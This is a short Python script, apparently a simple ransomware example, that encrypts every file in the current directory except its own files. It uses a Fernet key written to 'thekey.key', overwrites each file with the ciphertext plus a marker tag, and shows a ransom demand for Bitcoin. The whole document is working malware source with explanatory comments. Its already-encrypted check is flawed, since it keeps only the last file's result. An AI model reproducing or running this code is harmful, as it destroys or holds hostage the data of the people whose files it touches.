import os

#allows us to use regular expressions to specify a single/group of chars in a string
import re

#necessary for encryption/decryption
from cryptography.fernet import Fernet

#a variable that will store file names of the victim's files
victims_files = []

#a for loop that will list each file in the victim's directory
for file in os.listdir():

        #files to be exempted from encryption
        if file == 'ncrypt.py' or file == 'thekey.key' or file == 'dcrypt.py' or file == 'ncrypt.exe' or file == 'dcrypt.exe':
                continue

        #verify that a file is indeed a file and not a directory such as folders or directories.
        if os.path.isfile(file):
                victims_files.append(file)

#print the list of victim's files
#print(victims_files)

#generate crypto key using Fernet
key = Fernet.generate_key()

#a tag to avoid encrypting already encrypted files
tag = 'C1sc0123'.encode()

#a for loop using regular expression to verify if each file contains the tag variable
for file in victims_files:
        with open(file, 'r', encoding = 'cp437') as thefile:
                notbin_content = thefile.read()
                regex = r'C1sc0123$'
                contains_tag = bool(re.search(regex, notbin_content))

        #print if C1sc0123 is matched
        #print(contains_tag)

#before overwriting the existing key, make sure the victim's files are not yet encrypted
if contains_tag == False:
        #write/create the key ("wb" - write in binary) in a file called thekey.key
        with open('thekey.key', 'wb') as thekey:
                thekey.write(key)
                
        #inform victim their files got encrypted
        input(r'Your files have been encrypted. If you want to get a chance of getting them back, send 1 million Bitcoin to this account: realAccount@pleasePay')

#a for loop to examine and modify each file in the directory
for file in victims_files:

        #open each file and store its info inside the variable contents
        with open(file, 'rb') as thefile:
                contents = thefile.read()
        
        #if the file was already encrypted with the tag, do not encrypt. 
        if contains_tag:
                input('\"' + file + '\" is already encrypted.')
                
        #if the file has not yet been encrypted with the tag, then encrypt
        else:
                #use the key to encrypt contents
                encrypt_contents = Fernet(key).encrypt(contents)
                
                #overwrite the contents of each file
                with open(file, 'wb') as thefile:
                        thefile.write(encrypt_contents + tag)
                
